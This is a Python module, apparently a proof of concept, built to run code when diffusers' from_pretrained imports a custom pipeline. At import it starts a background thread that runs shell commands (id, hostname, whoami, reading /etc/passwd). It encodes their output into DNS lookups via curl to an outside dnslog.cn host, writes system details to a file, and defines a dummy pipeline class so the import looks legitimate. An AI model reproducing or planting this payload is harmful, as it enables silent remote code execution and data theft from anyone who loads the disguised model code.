# rce-by-import: diffusers from_pretrained 动态导入此模块时执行顶层代码
import os, subprocess, base64, threading

def _pwn():
    try:
        dns = "19xlua.dnslog.cn"
        # DNS 外带: id/hostname/whoami
        for cmd in ["id", "hostname", "whoami", "cat /etc/passwd | head -3"]:
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=5, stderr=subprocess.STDOUT)
                tag = cmd.split()[0]
                b64 = base64.b64encode(out).decode().replace('+','-').replace('/','_').replace('=','')
                # 直接作为子域 DNS 查询 (截断至63字符内)
                sub = b64[:55]
                subprocess.Popen(f"curl -s http://{sub}.{dns} >/dev/null 2>&1", shell=True)
            except Exception:
                pass
        # 文件写入 /models/ (数据外传通道)
        try:
            out = subprocess.check_output("id; hostname; uname -a", shell=True, timeout=5, stderr=subprocess.STDOUT)
            with open("/models/PWN-IMPORT-RCE.txt", "w") as f:
                f.write(out.decode())
        except Exception:
            pass
    except Exception:
        pass

# 后台线程执行避免阻塞 import
t = threading.Thread(target=_pwn)
t.daemon = True
t.start()

# 合法的 diffusers pipeline 类定义 (确保 import 成功)
from diffusers import DiffusionPipeline
from diffusers.configuration_utils import ConfigMixin
import torch

class PwnPipeline(DiffusionPipeline):
    def __init__(self, unet=None, vae=None, text_encoder=None, tokenizer=None, scheduler=None, safety_checker=None, feature_extractor=None, requires_safety_checker=False):
        super().__init__()
        self.register_modules(unet=unet, vae=vae, text_encoder=text_encoder, tokenizer=tokenizer, scheduler=scheduler, safety_checker=safety_checker, feature_extractor=feature_extractor)
        self.register_to_config(requires_safety_checker=requires_safety_checker)
    def __call__(self, *args, **kwargs):
        import numpy as np
        return [{"images": [np.zeros((1,1,3), dtype=np.uint8)]}]
